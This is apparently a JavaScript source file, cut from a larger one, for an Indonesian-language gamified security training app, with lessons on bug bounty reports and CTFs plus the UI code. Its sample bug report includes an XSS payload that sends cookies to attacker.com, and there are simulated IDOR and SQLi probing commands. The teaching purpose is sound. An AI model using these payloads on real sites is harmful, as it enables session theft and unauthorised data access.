  <li>🟠 Medium: $500-2,000 (moderate impact)</li>
  <li>🔴 High: $2,000-10,000 (significant impact)</li>
  <li>🟣 Critical: $10,000-$100,000+ (RCE, authentication bypass)</li>
</ul>
<h4>📝 Cara Menulis Bug Report yang Baik</h4>
<ul>
  <li><strong>Title</strong> yang jelas dan spesifik</li>
  <li><strong>Severity</strong> yang justified dengan CVSS score</li>
  <li><strong>Steps to Reproduce</strong> yang detail dan bisa diulang</li>
  <li><strong>Impact</strong> — apa dampak nyatanya bagi perusahaan/user</li>
  <li><strong>Evidence</strong> — screenshot, video, PoC code</li>
  <li><strong>Remediation</strong> — rekomendasi perbaikan</li>
</ul>
<div class="ct-tip-box">💡 <span>Mulai dari program dengan scope luas dan reward rendah untuk membangun reputasi. Reputasi tinggi di HackerOne membuka akses ke program private dengan reward lebih besar!</span></div>
<div class="ct-danger-box">⛔ <span>Selalu baca dan patuhi program policy sebelum testing! Jangan test sistem di luar scope, jangan simpan/share data yang kamu temukan, dan selalu laporkan dengan responsible disclosure!</span></div>
`,
        example: `# === Bug Report Template (HackerOne Style) ===

REPORT TITLE: Reflected XSS in Search Parameter Allows Cookie Theft

VULNERABILITY TYPE: Cross-Site Scripting (XSS) — Reflected

SEVERITY: High (CVSS 8.1)

CVSS VECTOR: AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N

AFFECTED ENDPOINT:
  URL: https://target.com/search?q=PAYLOAD
  Parameter: q (GET parameter)

STEPS TO REPRODUCE:
1. Buka browser dan navigasi ke URL berikut:
   https://target.com/search?q=<script>document.location='https://attacker.com/steal?c='+document.cookie</script>

2. Perhatikan bahwa JavaScript dieksekusi

3. Cookie sesi (termasuk session token) dikirim ke server attacker

PROOF OF CONCEPT (PoC):
  Payload: <img src=x onerror=alert(document.domain)>
  Video: [link ke screen recording]
  Screenshot: [attach]

IMPACT:
  Seorang attacker dapat:
  - Mencuri session cookie pengguna yang mengklik link berbahaya
  - Melakukan account takeover tanpa kredensial
  - Mengeksekusi tindakan atas nama korban
  - Estimasi korban potensial: semua pengguna aktif (~500k users)

REMEDIATION:
  1. Escape output HTML entities sebelum rendering
  2. Implementasi Content Security Policy (CSP)
  3. Gunakan HttpOnly + Secure flag untuk cookies
  4. Input validation dan sanitization`,
        editorStarter: `# === My Bug Report ===
# Isi laporan bug bounty yang professional

REPORT TITLE: [Describe vuln type + where + brief impact]

TARGET PROGRAM: 
SUBMITTED TO: [ ] HackerOne [ ] Bugcrowd [ ] Direct

VULNERABILITY DETAILS:
Type: [ ] SQLi [ ] XSS [ ] IDOR [ ] RCE [ ] Auth bypass [ ] Other
CWE: CWE-XXX
CVSS Score: 

CVSS Vector String:
AV: [N/A/L/P]  AC: [L/H]  PR: [N/L/H]  UI: [N/R]  S: [U/C]  C: [N/L/H]  I: [N/L/H]  A: [N/L/H]

AFFECTED ASSET:
URL/Endpoint: 
Parameter: 
Method: [ ] GET [ ] POST [ ] PUT [ ] DELETE

STEPS TO REPRODUCE:
1. 
2. 
3. 
4. 

PROOF OF CONCEPT:
Payload/Request:


Response/Evidence:


IMPACT ASSESSMENT:
What can an attacker do?
- 
- 
Business impact: 
Affected users: 

REMEDIATION RECOMMENDATION:
Short-term (immediate):
Long-term (proper fix):

REFERENCES:
- OWASP: 
- CVE: `,
        editorTask: 'Isi laporan bug bounty profesional untuk kerentanan XSS atau IDOR yang kamu pelajari sebelumnya. Buat serealistis mungkin.',
        terminalSim: `[hunter@kali ~]$ # Bug Bounty Recon — Target: bugbounty.example.com

[hunter@kali ~]$ subfinder -d example.com -silent
api.example.com
admin.example.com
staging.example.com  ← Interesting!
dev.example.com      ← Dev environment?

[hunter@kali ~]$ # Check staging — often less secure
[hunter@kali ~]$ curl -I https://staging.example.com

HTTP/2 200
x-powered-by: PHP/7.2.34    ← Old PHP version!
x-debug-token: abc123        ← Debug mode enabled! Info leak!

[hunter@kali ~]$ # Test for IDOR
curl "https://staging.example.com/api/user/1001/orders"
{"orders": [...], "user_id": 1001, "email": "victim@email.com"}

curl "https://staging.example.com/api/user/1002/orders"
{"orders": [...], "user_id": 1002, "email": "other@email.com"}
← No authorization check! IDOR found!

FINDING: IDOR in /api/user/{id}/orders
Severity: High (access other users' order data + PII)
Potential reward: $1,000-3,000`,
        quiz: {
          q: 'Apa yang dimaksud dengan "Responsible Disclosure" dalam bug bounty?',
          options: ['Langsung publikasi vulnerability ke sosial media', 'Melaporkan vulnerability kepada vendor dulu, memberikan waktu untuk perbaikan sebelum dipublikasi', 'Menjual vulnerability ke highest bidder', 'Tidak pernah mempublikasi vulnerability sama sekali'],
          correct: 1,
          explanation: 'Responsible disclosure berarti melaporkan vulnerability ke vendor/organisasi, memberikan waktu yang wajar untuk perbaikan (biasanya 90 hari), baru mempublikasi. Ini adalah standar etika industri keamanan siber.',
        },
        challenge: {
          title: 'Full Bug Report: IDOR',
          desc: 'Kamu menemukan IDOR di endpoint https://bugbounty-lab.com/api/v1/invoice/{id}. Semua invoice bisa diakses tanpa autentikasi. Buat laporan bug bounty profesional yang lengkap.',
          starter: `# === PROFESSIONAL BUG REPORT ===
# Platform: HackerOne (practice)
# Program: BugBountyLab

TITLE: 

SEVERITY: 

VULNERABILITY CLASS: IDOR (Insecure Direct Object Reference)
CWE: CWE-639

SUMMARY:
[2-3 kalimat menjelaskan inti masalah]

ENVIRONMENT:
URL: https://bugbounty-lab.com/api/v1/invoice/{id}
Auth Required: 
Method: GET

STEPS TO REPRODUCE:
Step 1: 

Step 2:

Step 3:

CURL PROOF OF CONCEPT:
# Normal authenticated request:

# IDOR — akses invoice orang lain tanpa auth:


RESPONSE (sensitive data exposed):
{
  
}

IMPACT:
Impact kepada pengguna:
- 
Impact kepada bisnis:
-

CVSS SCORE: [hitung manual]
AV:N / AC:L / PR:N / UI:N / S:U / C:H / I:N / A:N = ??

REMEDIATION:
Immediate:
Proper fix:

TIMELINE:
[Tanggal discovery] - Vulnerability found
[Tanggal laporan] - Reported to program
`,
          hint: 'Impact IDOR bisa sangat serius — akses ke data finansial semua pengguna. Jelaskan dengan konkret berapa pengguna terdampak dan data apa yang bisa diekspos.',
        },
        xp: 90,
      },
      {
        id: 'l10t2', title: 'CTF & Sertifikasi Pro', diff: 'expert',
        filename: 'ctf-certs.md',
        explain: `
<h3>CTF & Roadmap Sertifikasi Professional</h3>
<p>Capture The Flag (CTF) dan sertifikasi adalah cara terbaik membuktikan skill dan membuka peluang karir.</p>
<h4>🏁 CTF — Capture The Flag</h4>
<p>CTF adalah kompetisi keamanan di mana peserta memecahkan tantangan untuk mendapatkan "flag" (string tersembunyi).</p>
<ul>
  <li><strong>Jeopardy Style</strong> — Kategori berbeda (Web, Crypto, Forensics, Reversing, Pwn)</li>
  <li><strong>Attack-Defense</strong> — Tim menyerang dan mempertahankan infrastruktur</li>
</ul>
<h4>🎯 Platform CTF & Practice</h4>
<ul>
  <li><strong>TryHackMe</strong> — Guided, cocok pemula. Free + Premium.</li>
  <li><strong>HackTheBox</strong> — Machines untuk intermediate-expert</li>
  <li><strong>PicoCTF</strong> — CTF untuk pelajar, gratis</li>
  <li><strong>CTFtime.org</strong> — Kalender CTF internasional</li>
  <li><strong>PentesterLab</strong> — Web security focused</li>
  <li><strong>OverTheWire</strong> — Linux & web wargames</li>
</ul>
<h4>🎓 Sertifikasi Roadmap</h4>
<ul>
  <li><strong>Entry:</strong> CompTIA Security+, eJPT (INE), CEH</li>
  <li><strong>Intermediate:</strong> OSCP (Offensive Security) — Gold standard</li>
  <li><strong>Advanced:</strong> OSEP, OSED, GREM, GCFE, GCIH</li>
  <li><strong>Management:</strong> CISSP, CISM, CISO</li>
  <li><strong>Cloud:</strong> AWS Security Specialty, GCP Security</li>
</ul>
<div class="ct-tip-box">💡 <span>OSCP adalah sertifikasi yang paling dihargai di dunia pentesting. Ujiannya 24 jam tanpa henti — mendapat mesin yang harus di-compromise. Tapi persiapannya butuh 3-6 bulan full commitment!</span></div>
`,
        example: `# === CTF Toolkit — Tools & Techniques ===

# ============================
# WEB CHALLENGES
# ============================
# Inspect source code
curl -s https://ctf.target.com | grep -i "flag\|secret\|hint"

# Try common paths
for path in /robots.txt /.git /backup /admin /.env; do
  curl -s -o /dev/null -w "%{http_code} $path\n" https://ctf.target.com$path
done

# SQLi manual test
curl "https://ctf.target.com/user?id=1'" → error = SQLi possible!

# ============================
# FORENSICS CHALLENGES
# ============================
# File type identification
file mystery_file
binwalk mystery_file       # Hidden files inside?
exiftool image.jpg         # Metadata with flag?

# Steganography
steghide extract -sf image.jpg
zsteg image.png           # LSB steganography

# ============================
# CRYPTO CHALLENGES
# ============================
# Identify cipher
# Caesar, Vigenere, Base64, ROT13?
echo "SGVsbG8gV29ybGQ=" | base64 -d    # Decode base64
echo "Uryyb Jbeyq" | tr 'A-Za-z' 'N-ZA-Mn-za-m'  # ROT13

# ============================
# NETWORK CHALLENGES
# ============================
# Analyze pcap
tcpdump -r capture.pcap -A | grep -i "flag\|password\|secret"
wireshark capture.pcap  # GUI analysis`,
        editorStarter: `# === CTF Challenge Writeup Template ===
# Dokumentasi penyelesaian CTF challenge — penting untuk belajar!

CHALLENGE NAME: 
CATEGORY: [ ] Web [ ] Forensics [ ] Crypto [ ] Pwn [ ] Reversing [ ] OSINT [ ] Misc
DIFFICULTY: [ ] Easy [ ] Medium [ ] Hard [ ] Insane
POINTS: 
CTF EVENT: 
DATE: 

== DESCRIPTION ==
[Paste deskripsi challenge di sini]

== INITIAL ANALYSIS ==
Langkah pertama yang saya lakukan:
1. 
2. 

Tools yang saya gunakan:
- 

== SOLVING PROCESS ==

Step 1: [Apa yang saya coba pertama]
Command:

Output/Finding:

Step 2: [Langkah selanjutnya berdasarkan temuan]
Command:

Output/Finding:

Step 3: 

Breakthrough moment: [Apa yang akhirnya membuka jalan ke flag]

== FLAG ==
ctf{...}

== LESSONS LEARNED ==
1. 
2. 
3. 

== REFERENCES ==
Tools:
Techniques:`,
        editorTask: 'Buat writeup untuk CTF challenge yang pernah kamu selesaikan, atau buat writeup skenario fiktif yang realistis.',
        terminalSim: `[ctf@kali ~/challenge]$ ls -la
total 24
-rw-r--r-- mystery.jpg  (Steganography challenge?)
-rw-r--r-- hint.txt     "Lihat yang tidak terlihat"

[ctf@kali ~/challenge]$ file mystery.jpg
mystery.jpg: JPEG image data, JFIF format

[ctf@kali ~/challenge]$ binwalk mystery.jpg

DECIMAL    HEXADECIMAL    DESCRIPTION
0          0x0            JPEG image data
148291     0x242C3        Zip archive (might be hidden file!)

[ctf@kali ~/challenge]$ binwalk -e mystery.jpg

[ctf@kali ~/challenge]$ ls _mystery.jpg.extracted/
242C3.zip

[ctf@kali ~/challenge]$ unzip 242C3.zip
Archive: 242C3.zip
  inflating: secret.txt

[ctf@kali ~/challenge]$ cat secret.txt
Selamat! Kamu menemukan flag tersembunyi:
ctf{st3g4n0gr4phy_1s_fun_and_tricky}

🎉 FLAG FOUND: ctf{st3g4n0gr4phy_1s_fun_and_tricky}
Technique: File hiding using steganography (binwalk extraction)`,
        quiz: {
          q: 'Sertifikasi mana yang dianggap "gold standard" untuk penetration tester?',
          options: ['CompTIA Security+', 'CEH (Certified Ethical Hacker)', 'OSCP (Offensive Security Certified Professional)', 'CISSP'],
          correct: 2,
          explanation: 'OSCP dari Offensive Security diakui sebagai gold standard pentesting karena ujiannya sepenuhnya praktis — 24 jam nonstop hacking mesin nyata tanpa multiple choice. Ini membuktikan kemampuan hacking nyata.',
        },
        challenge: {
          title: 'My Security Roadmap',
          desc: 'Buat roadmap personal yang detail dan realistis untuk mencapai tujuan karir cyber security kamu dalam 12 bulan ke depan. Sertakan resources, milestone, dan timeline spesifik.',
          starter: `# === My 12-Month Cyber Security Roadmap ===
# Target Role: 
# Start Level: [ ] Complete beginner [ ] IT background [ ] Developer

## MONTH 1-2: Foundation
Goals:
- [ ] 
- [ ] 
Resources:
- Platform: TryHackMe (Pre-Security path)
- Books: 
- Hours/week: ___

Milestone Check: 
Budget: Rp ___

## MONTH 3-4: Core Skills
Goals:
- [ ] 
- [ ] 
Resources:

Milestone Check:
Certification Target: 

## MONTH 5-6: Hands-on Labs
Goals:
- [ ] HackTheBox: 10 Easy machines
- [ ] 
Resources:

CTF Participation: 

## MONTH 7-9: Specialization
Choose ONE path:
[ ] Pentesting → OSCP prep
[ ] Blue Team → SOC + Splunk
[ ] Cloud Security → AWS Security

Goals:
- [ ] 
Resources:

## MONTH 10-12: Career Launch
Goals:
- [ ] Build portfolio (writeups, GitHub, LinkedIn)
- [ ] Apply for entry-level positions
- [ ] Bug bounty submissions

Target Salary Range: Rp ___
Target Companies: 

## WEEKLY SCHEDULE:
Weekday (1-2h/day): 
Weekend (4-6h/day): 

## ACCOUNTABILITY:
Study partner: 
Progress tracking: 
Monthly review date: `,
          hint: 'Realistis dengan waktu yang tersedia. Konsistensi 1-2 jam sehari lebih efektif dari marathon 10 jam sekali seminggu. Pilih SATU spesialisasi dan fokus!',
        },
        xp: 100,
      },
    ]
  },
];

// ================================================================
// STATE
// ================================================================
let ctState = {
  xp: 0,
  level: 1,
  streak: 0,
  completedTopics: [],
  currentLevel: null,
  currentTopicIdx: 0,
  currentTab: 'explain',
  typingMode: false,
  typingStartTime: null,
  quizAnswered: false,
  liveUpdateTimer: null,
};

const CT_RANKS = [
  [0,    'Script Kiddie'],
  [200,  'Security Apprentice'],
  [500,  'Junior Analyst'],
  [1000, 'Security Analyst'],
  [2000, 'Penetration Tester'],
  [3500, 'Security Engineer'],
  [5000, 'Senior Red Teamer'],
  [7000, 'Security Architect'],
  [9000, 'CISO Level'],
];
const CT_XP_LEVELS = [0, 200, 500, 1000, 2000, 3500, 5000, 7000, 9000, 12000];

function ctGetRank(xp) {
  let rank = CT_RANKS[0][1];
  for (const [req, name] of CT_RANKS) { if (xp >= req) rank = name; }
  return rank;
}

function ctAllTopics() {
  return CT_CURRICULUM.flatMap(lv => lv.topics.map(t => ({ ...t, levelId: lv.id, levelName: lv.name })));
}

// ================================================================
// INIT
// ================================================================
function ctInit() {
  try {
    const saved = JSON.parse(localStorage.getItem('typecraft_cyber_trainer') || 'null');
    if (saved) {
      ctState.xp = saved.xp || 0;
      ctState.level = saved.level || 1;
      ctState.streak = saved.streak || 0;
      ctState.completedTopics = saved.completedTopics || [];
    }
  } catch(e) {}

  ctBuildCurriculum();
  ctUpdateXPBar();
  ctRenderProgressOverview();
  ctUpdateDailyChallenge();
}

function ctSave() {
  try {
    localStorage.setItem('typecraft_cyber_trainer', JSON.stringify({
      xp: ctState.xp,
      level: ctState.level,
      streak: ctState.streak,
      completedTopics: ctState.completedTopics,
    }));
  } catch(e) {}
}

// ================================================================
// CURRICULUM SIDEBAR
// ================================================================
function ctBuildCurriculum() {
  const container = document.getElementById('ct-curriculum-list');
  if (!container) return;
  container.innerHTML = '';

  CT_CURRICULUM.forEach(lv => {
    const totalTopics = lv.topics.length;
    const doneTopics = lv.topics.filter(t => ctState.completedTopics.includes(t.id)).length;
    const isOpen = ctState.currentLevel === lv.id;

    const lvEl = document.createElement('div');
    lvEl.className = 'ct-level-item';

    const header = document.createElement('div');
    header.className = 'ct-level-header' + (isOpen ? ' open' : '');
    header.innerHTML = `
      <span style="width:8px;height:8px;border-radius:50%;background:${lv.color};flex-shrink:0;display:inline-block"></span>
      <span>${lv.icon} ${lv.name}</span>
      <span style="margin-left:auto;font-size:10px;font-weight:400;color:var(--text3)">${doneTopics}/${totalTopics}</span>
      <span style="font-size:10px;margin-left:4px">${isOpen ? '▼' : '▶'}</span>
    `;

    const topicsEl = document.createElement('div');
    topicsEl.className = 'ct-level-topics' + (isOpen ? ' open' : '');

    lv.topics.forEach((topic, idx) => {
      const done = ctState.completedTopics.includes(topic.id);
      const isActive = ctState.currentLevel === lv.id && ctState.currentTopicIdx === idx;
      const topicEl = document.createElement('div');
      topicEl.className = 'ct-topic-item' + (done ? ' completed' : '') + (isActive ? ' active' : '');
      topicEl.innerHTML = `<span>${topic.title}</span><span class="ct-topic-progress">${topic.xp} XP</span>`;
      topicEl.onclick = () => ctOpenTopic(lv.id, idx);
      topicsEl.appendChild(topicEl);
    });

    header.onclick = () => {
      const isNowOpen = topicsEl.classList.contains('open');
      document.querySelectorAll('.ct-level-topics').forEach(t => t.classList.remove('open'));
      document.querySelectorAll('.ct-level-header').forEach(h => h.classList.remove('open'));
      if (!isNowOpen) {
        topicsEl.classList.add('open');
        header.classList.add('open');
      }
    };

    lvEl.appendChild(header);
    lvEl.appendChild(topicsEl);
    container.appendChild(lvEl);
  });
}

// ================================================================
// OPEN TOPIC
// ================================================================
function ctOpenTopic(levelId, topicIdx) {
  const level = CT_CURRICULUM.find(l => l.id === levelId);
  if (!level) return;

  ctState.currentLevel = levelId;
  ctState.currentTopicIdx = topicIdx;
  const topic = level.topics[topicIdx];
  if (!topic) return;

  ctState.quizAnswered = false;

  document.getElementById('ct-welcome-screen').style.display = 'none';
  document.getElementById('ct-lesson-screen').style.display = 'block';
  document.getElementById('ct-dragdrop-screen').style.display = 'none';
  document.getElementById('ct-debug-screen').style.display = 'none';

  document.getElementById('ct-lesson-breadcrumb').textContent = `Level ${levelId} · ${level.name}`;
  document.getElementById('ct-lesson-title').textContent = topic.title;
  document.getElementById('ct-lesson-progress-text').textContent = `Topik ${topicIdx + 1} dari ${level.topics.length}`;

  if (document.getElementById('ct-editor-filename')) {
    document.getElementById('ct-editor-filename').textContent = topic.filename || 'lab.sh';
  }

  const diffMap = { beginner: 'diff-easy', intermediate: 'diff-medium', advanced: 'diff-hard', expert: 'diff-expert' };
  const badge = document.getElementById('ct-diff-badge');
  badge.textContent = topic.diff.charAt(0).toUpperCase() + topic.diff.slice(1);
  badge.className = 'difficulty-badge ' + (diffMap[topic.diff] || 'diff-easy');
  document.getElementById('ct-topic-badge').textContent = level.name;

  ctPopulateExplain(topic);
  ctPopulateExample(topic);
  ctPopulateEditor(topic);
  ctPopulateQuiz(topic);
  ctPopulateChallenge(topic);

  ctSwitchTab('explain', document.querySelector('.ct-tab'));

  const doneEl = document.getElementById('ct-lesson-complete-badge');
  doneEl.style.display = ctState.completedTopics.includes(topic.id) ? 'flex' : 'none';

  ctBuildCurriculum();

  setTimeout(() => {
    const headers = document.querySelectorAll('.ct-level-header');
    const topicLists = document.querySelectorAll('.ct-level-topics');
    headers.forEach((h, i) => {
      const lv = CT_CURRICULUM[i];
      if (lv && lv.id === levelId) {
        h.classList.add('open');
        if (topicLists[i]) topicLists[i].classList.add('open');
      }
    });
  }, 50);
}

// ================================================================
// POPULATE TABS
// ================================================================
function ctPopulateExplain(topic) {
  const el = document.getElementById('ct-explain-content');
  el.innerHTML = topic.explain || '<p>Materi belum tersedia.</p>';
}

function ctPopulateExample(topic) {
  const el = document.getElementById('ct-example-content');
  const code = topic.example || '';
  el.innerHTML = `
    <h3>💡 Demo: ${topic.title}</h3>
    <div class="ct-copy-row">
      <button class="ct-copy-btn" onclick="ctCopyToClipboard(this, ${JSON.stringify(code)})">📋 Copy</button>
    </div>
    <pre class="ct-code-block">${ctEsc(code)}</pre>
    ${topic.previewNote ? `<div class="ct-tip-box" style="margin-top:10px">📌 <span>${topic.previewNote}</span></div>` : ''}
    <div class="ct-tip-box" style="margin-top:12px">🛡️ <span>Gunakan command/tool ini hanya di environment yang kamu miliki izin untuk testing. Lab VM adalah tempat yang aman untuk berlatih.</span></div>
  `;
}

function ctPopulateEditor(topic) {
  const editor = document.getElementById('ct-code-editor');
  const tipsEl = document.getElementById('ct-editor-tips');
  if (editor) editor.value = topic.editorStarter || topic.example || '';
  if (tipsEl) tipsEl.textContent = '🎯 Task: ' + (topic.editorTask || 'Modifikasi kode/command di atas dan klik Simulate untuk melihat output.');

  // Setup typing mode
  if (topic.example) {
    const typingText = topic.example;
    const display = document.getElementById('ct-typing-display');
    if (display) {
      display.innerHTML = '';
      typingText.split('').forEach((ch, i) => {
        const span = document.createElement('span');
        span.className = 'char ' + (i === 0 ? 'current' : 'pending');
        span.textContent = ch === '\n' ? '↵' : (ch === ' ' ? '\u00a0' : ch);
        if (ch === '\n') { span.style.color = 'var(--text3)'; span.style.fontSize = '10px'; display.appendChild(span); display.appendChild(document.createElement('br')); return; }
        display.appendChild(span);
      });
    }
    const input = document.getElementById('ct-typing-input');
    if (input) { input.value = ''; input._targetText = typingText; }
  }

  // Show terminal simulation
  ctSimulateTerminal(topic);
}

function ctSimulateTerminal(topic) {
  const terminal = document.getElementById('ct-terminal-output');
  if (!terminal) return;

  if (topic.terminalSim) {
    terminal.innerHTML = '';
    const lines = topic.terminalSim.split('\n');
    let delay = 0;
    lines.forEach(line => {
      setTimeout(() => {
        const div = document.createElement('div');
        if (line.startsWith('[') || line.includes('@')) {
          div.innerHTML = `<span class="t-prompt">${ctEsc(line)}</span>`;
        } else if (line.includes('✓') || line.includes('SUCCESS') || line.includes('FOUND')) {
          div.innerHTML = `<span class="t-success">${ctEsc(line)}</span>`;
        } else if (line.includes('❌') || line.includes('CRITICAL') || line.includes('ERROR')) {
          div.innerHTML = `<span class="t-error">${ctEsc(line)}</span>`;
        } else if (line.includes('⚠️') || line.includes('WARNING') || line.includes('SUSPICIOUS')) {
          div.innerHTML = `<span class="t-warn">${ctEsc(line)}</span>`;
        } else if (line.includes('[*]') || line.includes('[+]') || line.includes('INFO')) {
          div.innerHTML = `<span class="t-info">${ctEsc(line)}</span>`;
        } else {
          div.innerHTML = `<span class="t-output">${ctEsc(line)}</span>`;
        }
        terminal.appendChild(div);
        terminal.scrollTop = terminal.scrollHeight;
      }, delay);
      delay += 80;
    });
  } else {
    terminal.innerHTML = '<span class="t-output">Klik [Simulate] untuk menjalankan kode dan melihat output di sini...</span>';
  }
}

function ctPopulateQuiz(topic) {
  const el = document.getElementById('ct-quiz-content');
  if (!topic.quiz) { el.innerHTML = '<p style="color:var(--text3)">Quiz untuk topik ini akan segera hadir.</p>'; return; }

  const q = topic.quiz;
  ctState.quizAnswered = false;

  el.innerHTML = `
    <h3 style="margin-bottom:12px">🧠 Quiz: ${topic.title}</h3>
    <p style="font-size:14px;color:var(--text2);margin-bottom:16px;line-height:1.6"><strong>${q.q}</strong></p>
    <div id="ct-quiz-options-wrap">
      ${q.options.map((opt, i) => `
        <button class="ct-quiz-option" onclick="ctAnswerQuiz(${i}, ${q.correct}, this)">
          <span style="color:var(--text3);margin-right:8px;font-family:var(--font-mono)">${['A','B','C','D'][i]}.</span> ${ctEsc(opt)}
        </button>
      `).join('')}
    </div>
    <div id="ct-quiz-result-box"></div>
  `;
}

function ctAnswerQuiz(chosen, correct, btn) {
  if (ctState.quizAnswered) return;
  ctState.quizAnswered = true;

  const topic = ctGetCurrentTopic();
  const allBtns = document.querySelectorAll('.ct-quiz-option');
  allBtns.forEach(b => b.style.pointerEvents = 'none');

  if (chosen === correct) {
    btn.classList.add('correct');
    const xpBonus = Math.round((topic?.xp || 30) * 0.3);
    document.getElementById('ct-quiz-result-box').innerHTML = `
      <div class="ct-quiz-result pass">✅ Benar! +${xpBonus} XP<br><small style="opacity:.8">${topic?.quiz?.explanation || ''}</small></div>`;
    ctAddXP(xpBonus);
  } else {
    btn.classList.add('wrong');
    if (allBtns[correct]) allBtns[correct].classList.add('correct');
    document.getElementById('ct-quiz-result-box').innerHTML = `
      <div class="ct-quiz-result fail">❌ Belum tepat! Jawaban: ${['A','B','C','D'][correct]}<br><small style="opacity:.8">${topic?.quiz?.explanation || ''}</small></div>`;
  }
}

function ctPopulateChallenge(topic) {
  const el = document.getElementById('ct-challenge-content');
  if (!topic.challenge) { el.innerHTML = '<p style="color:var(--text3)">Challenge untuk topik ini akan segera hadir.</p>'; return; }

  const ch = topic.challenge;
  el.innerHTML = `
    <h3>🏆 ${ch.title}</h3>
    <p style="font-size:13px;color:var(--text2);line-height:1.7;margin-bottom:16px">${ch.desc}</p>
    <div class="ct-tip-box" style="margin-bottom:14px">💡 <span>Hint: ${ch.hint}</span></div>
    <div class="ct-editor-wrap">
      <div class="ct-editor-panel">
        <div class="ct-panel-header">
          <span class="panel-dot red"></span><span class="panel-dot yellow"></span><span class="panel-dot green"></span>
          <span style="margin-left:8px;font-size:12px;color:var(--text3)">challenge.sh</span>
          <div style="margin-left:auto;display:flex;gap:6px">
            <button class="btn btn-primary btn-sm" onclick="ctRunChallenge()">▶ Run</button>
            <button class="btn btn-ghost btn-sm" onclick="ctResetChallenge()">↺ Reset</button>
          </div>
        </div>
        <textarea id="ct-challenge-editor" class="ct-code-editor" spellcheck="false" style="min-height:200px">${ctEsc(ch.starter)}</textarea>
      </div>
      <div class="ct-preview-panel">
        <div class="ct-panel-header">
          <span class="panel-dot red"></span><span class="panel-dot yellow"></span><span class="panel-dot green"></span>
          <span style="margin-left:8px;font-size:12px;color:var(--text3)">Output</span>
        </div>
        <div id="ct-challenge-terminal" class="ct-terminal">Klik Run untuk melihat output...</div>
      </div>
    </div>
    <div style="display:flex;gap:10px;margin-top:12px">
      <button class="btn btn-primary btn-sm" onclick="ctSubmitChallenge()">✅ Selesai Challenge (+${topic.xp} XP)</button>
    </div>
    <div id="ct-challenge-feedback" style="margin-top:10px"></div>
  `;
}

// ================================================================
// EDITOR / TERMINAL FUNCTIONS
// ================================================================
function ctLiveUpdate() {
  // No live preview for security trainer (code-only)
}

function ctRunCode() {
  const code = document.getElementById('ct-code-editor')?.value || '';
  const terminal = document.getElementById('ct-terminal-output');
  if (!terminal) return;

  terminal.innerHTML = '';
  const lines = [
    `[analyst@seclab ~]$ # Running your code...`,
    ``,
    `# Your code:`,
    ...code.split('\n').slice(0, 15),
    ``,
    `[analyst@seclab ~]$ # Code recorded. In a real lab, run this in your VM.`,
    `# Use tools like Kali Linux, TryHackMe, or HackTheBox for live practice.`,
  ];

  lines.forEach((line, i) => {
    setTimeout(() => {
      const div = document.createElement('div');
      div.innerHTML = `<span class="${line.startsWith('[') ? 't-prompt' : 't-output'}">${ctEsc(line)}</span>`;
      terminal.appendChild(div);
      terminal.scrollTop = terminal.scrollHeight;
    }, i * 60);
  });
}

function ctResetCode() {
  const topic = ctGetCurrentTopic();
  if (topic) {
    document.getElementById('ct-code-editor').value = topic.editorStarter || topic.example || '';
    ctSimulateTerminal(topic);
  }
}

function ctCopyCode() {
  const code = document.getElementById('ct-code-editor')?.value || '';
  ctCopyToClipboard(null, code);
}

function ctRunChallenge() {
  const code = document.getElementById('ct-challenge-editor')?.value || '';
  const terminal = document.getElementById('ct-challenge-terminal');
  if (!terminal) return;
  terminal.innerHTML = `<span class="t-prompt">[analyst@seclab ~]$ # Challenge submitted for review...</span>\n<span class="t-output">${ctEsc(code.substring(0, 200))}${code.length > 200 ? '\n...' : ''}</span>`;
}

function ctResetChallenge() {
  const topic = ctGetCurrentTopic();
  if (topic?.challenge) {
    document.getElementById('ct-challenge-editor').value = topic.challenge.starter;
    const terminal = document.getElementById('ct-challenge-terminal');
    if (terminal) terminal.innerHTML = 'Klik Run untuk melihat output...';
  }
}

function ctSubmitChallenge() {
  const topic = ctGetCurrentTopic();
  const feedback = document.getElementById('ct-challenge-feedback');
  const xp = topic?.xp || 50;
  ctAddXP(xp);
  if (feedback) feedback.innerHTML = `<div class="ct-tip-box">🎉 <span>Challenge selesai! +${xp} XP. Kerja bagus! Lanjutkan ke topik berikutnya.</span></div>`;
  if (typeof showToast === 'function') showToast('🏆', `Challenge selesai! +${xp} XP`);
}

// ================================================================
// TYPING MODE
// ================================================================
function ctToggleTypingMode() {
  ctState.typingMode = !ctState.typingMode;
  const zone = document.getElementById('ct-typing-zone');
  const btn = document.getElementById('ct-typing-mode-btn');
  if (zone) zone.style.display = ctState.typingMode ? 'block' : 'none';
  if (btn) btn.textContent = ctState.typingMode ? '✕ Exit Typing Mode' : '⌨️ Typing Mode';
  if (ctState.typingMode) {
    const input = document.getElementById('ct-typing-input');
    if (input) input.focus();
    ctState.typingStartTime = null;
  }
}

function ctHandleTypingInput(e) {
  const input = e.target;
  const typed = input.value;
  const text = input._targetText || '';

  if (!ctState.typingStartTime && typed.length > 0) ctState.typingStartTime = Date.now();

  const display = document.getElementById('ct-typing-display');
  const spans = display.querySelectorAll('.char');
  let spanIdx = 0, typedIdx = 0;

  text.split('').forEach((ch) => {
    const span = spans[spanIdx];
    if (!span) { spanIdx++; return; }
    span.className = 'char';
    if (typedIdx < typed.length) {
      span.className = 'char ' + (typed[typedIdx] === ch ? 'correct' : 'wrong');
      typedIdx++;
    } else if (typedIdx === typed.length) {
      span.className = 'char current';
    } else {
      span.className = 'char pending';
    }
    spanIdx++;
    if (ch === '\n') spanIdx++;
  });

  const correct = typed.split('').filter((ch, i) => ch === text[i]).length;
  const elapsed = ctState.typingStartTime ? (Date.now() - ctState.typingStartTime) / 60000 : 0.001;
  const wpm = Math.round((correct / 5) / elapsed) || 0;
  const acc = typed.length > 0 ? Math.round((correct / typed.length) * 100) : 100;
  const prog = Math.round((typed.length / text.length) * 100);

  document.getElementById('ct-t-wpm').textContent = wpm;
  document.getElementById('ct-t-acc').textContent = acc + '%';
  document.getElementById('ct-t-prog').textContent = Math.min(prog, 100) + '%';

  if (typed === text) {
    ctAddXP(25);
    if (typeof showToast === 'function') showToast('⌨️', 'Typing selesai! +25 XP');
    input.value = '';
    ctState.typingStartTime = null;
  }
}

// ================================================================
// COMPLETE LESSON
// ================================================================
function ctCompleteLesson() {
  const topic = ctGetCurrentTopic();
  if (!topic) return;

  if (!ctState.completedTopics.includes(topic.id)) {
    ctState.completedTopics.push(topic.id);
    ctState.streak++;
    ctAddXP(topic.xp || 40);
    ctShowBadge('✅ Topik selesai! +' + (topic.xp || 40) + ' XP');
    ctSave();
  }

  document.getElementById('ct-lesson-complete-badge').style.display = 'flex';
  ctBuildCurriculum();
